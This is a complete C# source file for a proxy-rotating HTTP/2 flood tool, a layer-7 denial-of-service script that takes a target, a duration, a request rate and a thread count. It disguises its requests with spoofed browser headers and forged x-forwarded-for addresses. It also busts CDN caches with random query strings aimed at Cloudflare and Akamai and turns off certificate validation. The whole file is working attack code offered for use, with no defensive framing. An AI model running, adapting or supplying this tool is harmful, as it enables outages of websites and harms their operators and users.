// Http2AdvancedFlood.cs
// Compile: dotnet new console -n Http2AdvancedFlood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <time> <rate> <threads> <proxyfile> [--cache true] [--rushaway true] [--http 1/2/mix]

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Http2AdvancedFlood
{
    static readonly Random _rand = new Random();
    static string _target;
    static int _durationSec;
    static int _ratePerThread;
    static int _threads;
    static string _proxyFile;
    static string[] _proxies;
    static bool _cacheBypass;
    static bool _rushAway;
    static string _httpMode = "2";  // "1", "2", or "mix"

    // Browser profiles (simplified but realistic)
    static readonly Dictionary<string, BrowserProfile> _browserProfiles = new()
    {
        ["chrome"] = new BrowserProfile
        {
            UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            SecChUa = "\"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not:A-Brand\";v=\"99\"",
            SecChUaPlatform = "\"Windows\"",
            SecChUaMobile = "?0",
            Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            AcceptLanguage = "en-US,en;q=0.9",
            AcceptEncoding = "gzip, deflate, br"
        },
        ["firefox"] = new BrowserProfile
        {
            UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
            SecChUa = "\"Firefox\";v=\"118.0\", \"Gecko\";v=\"20100101\"",
            SecChUaPlatform = "\"Windows\"",
            SecChUaMobile = "?0",
            Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            AcceptLanguage = "en-US,en;q=0.5",
            AcceptEncoding = "gzip, deflate, br"
        },
        ["ios"] = new BrowserProfile
        {
            UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/138.0 Mobile/15E148 Safari/605.1.15",
            SecChUa = "\"Firefox\";v=\"138\", \"iOS\";v=\"17\"",
            SecChUaPlatform = "\"iOS\"",
            SecChUaMobile = "?1",
            Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            AcceptLanguage = "en-US,en;q=0.9,fr;q=0.8,ja;q=0.7,zh-CN;q=0.6,zh;q=0.5",
            AcceptEncoding = "gzip, deflate, br"
        }
    };

    class BrowserProfile
    {
        public string UserAgent { get; set; }
        public string SecChUa { get; set; }
        public string SecChUaPlatform { get; set; }
        public string SecChUaMobile { get; set; }
        public string Accept { get; set; }
        public string AcceptLanguage { get; set; }
        public string AcceptEncoding { get; set; }
    }

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: Http2AdvancedFlood <target> <time> <rate> <threads> <proxyfile> [--cache true] [--rushaway true] [--http 1/2/mix]");
            return;
        }

        _target = args[0];
        _durationSec = int.Parse(args[1]);
        _ratePerThread = int.Parse(args[2]);
        _threads = int.Parse(args[3]);
        _proxyFile = args[4];

        for (int i = 5; i < args.Length; i++)
        {
            if (args[i] == "--cache" && i + 1 < args.Length)
                _cacheBypass = args[++i].ToLower() == "true";
            else if (args[i] == "--rushaway" && i + 1 < args.Length)
                _rushAway = args[++i].ToLower() == "true";
            else if (args[i] == "--http" && i + 1 < args.Length)
                _httpMode = args[++i].ToLower();
        }

        if (!File.Exists(_proxyFile))
        {
            Console.WriteLine($"[ERROR] Proxy file not found: {_proxyFile}");
            return;
        }
        _proxies = File.ReadAllLines(_proxyFile)
            .Select(l => l.Trim())
            .Where(l => !string.IsNullOrEmpty(l) && !l.StartsWith('#'))
            .ToArray();

        if (_proxies.Length == 0)
        {
            Console.WriteLine("[ERROR] No proxies found.");
            return;
        }

        Console.WriteLine($"\n[🔥] Advanced Flood | Target: {_target}");
        Console.WriteLine($"     Duration: {_durationSec}s | Rate/thread: {_ratePerThread} req/s");
        Console.WriteLine($"     Threads: {_threads} | Total RPS: {_threads * _ratePerThread}");
        Console.WriteLine($"     Proxies: {_proxies.Length} | Cache Bypass: {_cacheBypass}");
        Console.WriteLine($"     Rush Away: {_rushAway} | HTTP Mode: {_httpMode}\n");

        var cts = new CancellationTokenSource();
        var tasks = new Task[_threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < _threads; i++)
        {
            int id = i;
            counters[id] = 0;
            tasks[i] = Task.Run(() => Worker(id, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Thread {kv.Key}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Flood finished.");
    }

    static async Task Worker(int id, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Select a random proxy for this worker
        string proxyStr = _proxies[_rand.Next(_proxies.Length)];
        var proxyParts = proxyStr.Split(':');
        if (proxyParts.Length != 2)
        {
            Console.WriteLine($"[Thread {id}] Invalid proxy format: {proxyStr}");
            return;
        }

        var proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));

        // Determine HTTP version for this worker (mix per worker)
        string httpVer = _httpMode;
        if (_httpMode == "mix")
            httpVer = _rand.Next(2) == 0 ? "2" : "1";

        var handler = new SocketsHttpHandler
        {
            Proxy = proxy,
            UseProxy = true,
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        if (httpVer == "2")
            handler.DefaultVersionPolicy = HttpVersionPolicy.RequestVersionExact;
        else
            handler.DefaultVersionPolicy = HttpVersionPolicy.RequestVersionOrLower;

        using var client = new HttpClient(handler);
        var uri = new Uri(_target);
        string basePath = uri.PathAndQuery;
        if (string.IsNullOrEmpty(basePath)) basePath = "/";
        bool hasQuery = basePath.Contains('?');

        // Select browser profile randomly (weighted toward Chrome and Firefox)
        string browserKey;
        double rand = _rand.NextDouble();
        if (rand < 0.45) browserKey = "chrome";
        else if (rand < 0.9) browserKey = "firefox";
        else browserKey = "ios";
        var profile = _browserProfiles[browserKey];

        var sw = Stopwatch.StartNew();
        int intervalMs = 1000 / _ratePerThread;

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _durationSec)
        {
            // Build request URI with cache busting
            string requestUri = BuildUri(uri, basePath, hasQuery);

            // Prepare request message
            var request = new HttpRequestMessage(HttpMethod.Get, requestUri);

            // Apply browser headers
            request.Headers.UserAgent.ParseAdd(profile.UserAgent);
            request.Headers.Add("Accept", profile.Accept);
            request.Headers.Add("Accept-Language", profile.AcceptLanguage);
            request.Headers.Add("Accept-Encoding", profile.AcceptEncoding);
            request.Headers.Add("sec-ch-ua", profile.SecChUa);
            request.Headers.Add("sec-ch-ua-mobile", profile.SecChUaMobile);
            request.Headers.Add("sec-ch-ua-platform", profile.SecChUaPlatform);
            request.Headers.Add("sec-fetch-dest", "document");
            request.Headers.Add("sec-fetch-mode", "navigate");
            request.Headers.Add("sec-fetch-site", "none");
            request.Headers.Add("sec-fetch-user", "?1");
            request.Headers.Add("upgrade-insecure-requests", "1");
            request.Headers.Add("te", "trailers");

            // Cache control
            if (_cacheBypass)
            {
                request.Headers.CacheControl = new CacheControlHeaderValue
                {
                    NoCache = true,
                    NoStore = true,
                    MustRevalidate = true,
                    MaxAge = TimeSpan.Zero
                };
                request.Headers.Add("pragma", "no-cache");
                request.Headers.Add("expires", "-1");
                request.Headers.Add("x-cache-buster", RandomString(10));
                request.Headers.Add("x-forwarded-for", RandomIP());
                request.Headers.Add("x-real-ip", RandomIP());
                request.Headers.Add("x-bypass-cache", "true");
            }
            else if (_rand.NextDouble() < 0.7)
            {
                request.Headers.CacheControl = new CacheControlHeaderValue
                {
                    NoCache = _rand.NextDouble() < 0.5
                };
            }

            // Random referer
            if (_rand.NextDouble() < 0.5)
                request.Headers.Referrer = new Uri($"https://{RandomDomain()}/");

            // Random origin
            if (_rand.NextDouble() < 0.4)
                request.Headers.Add("origin", $"https://{uri.Host}");

            // Random priority
            if (_rand.NextDouble() < 0.3)
                request.Headers.Add("priority", _rand.NextDouble() < 0.5 ? "u=1, i" : "u=0, i");

            try
            {
                using var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch
            {
                // Ignore errors
            }

            // Simulate rush away: close connection after random interval? 
            // Not easily done without low-level socket. We'll just ignore for now.
            if (_rushAway && _rand.NextDouble() < 0.05)
            {
                // Force close the client and recreate? Not recommended.
                // We'll just skip.
            }

            await Task.Delay(intervalMs, ct);
        }
    }

    static string BuildUri(Uri uri, string basePath, bool hasQuery)
    {
        string path = basePath;
        string query = "";

        if (_cacheBypass)
        {
            long timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
            string micro = Guid.NewGuid().ToString("N").Substring(0, 8);
            var breakers = new List<string>
            {
                $"_cb={timestamp}{RandomString(3)}",
                $"_t={timestamp}",
                $"_r={RandomHex(6)}",
                $"_v={_rand.Next(100000, 999999)}",
                $"_bust={micro}",
                $"_nocache={RandomString(8)}",
                $"_ts={timestamp / 1000}{RandomString(3)}",
                $"_uid={Guid.NewGuid():N}"
            };
            int numParams = _rand.Next(2, 5);
            var selected = breakers.OrderBy(x => _rand.Next()).Take(numParams).ToList();
            query = "?" + string.Join("&", selected);
            if (_rand.NextDouble() < 0.4) query += "&cf_cache_bust=" + timestamp;
            if (_rand.NextDouble() < 0.3) query += "&akamai_bypass=" + RandomString(6);
        }
        else if (_rand.NextDouble() > 0.5)
        {
            query = $"?{RandomString(7)}={RandomString(15)}";
        }

        // Add random path suffix if needed
        if (_cacheBypass && _rand.NextDouble() < 0.6)
        {
            path += (path.EndsWith('/') ? "" : "/") + RandomString(_rand.Next(3, 8));
        }

        return $"{uri.Scheme}://{uri.Host}{path}{query}";
    }

    static string RandomString(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(chars, length).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }

    static string RandomHex(int length)
    {
        var bytes = new byte[length];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(bytes);
        return BitConverter.ToString(bytes).Replace("-", "").ToLower();
    }

    static string RandomIP()
    {
        return $"{_rand.Next(1, 255)}.{_rand.Next(0, 255)}.{_rand.Next(0, 255)}.{_rand.Next(1, 255)}";
    }

    static string RandomDomain()
    {
        var domains = new[] { "google.com", "facebook.com", "youtube.com", "twitter.com", "reddit.com", "github.com" };
        return domains[_rand.Next(domains.Length)];
    }
}
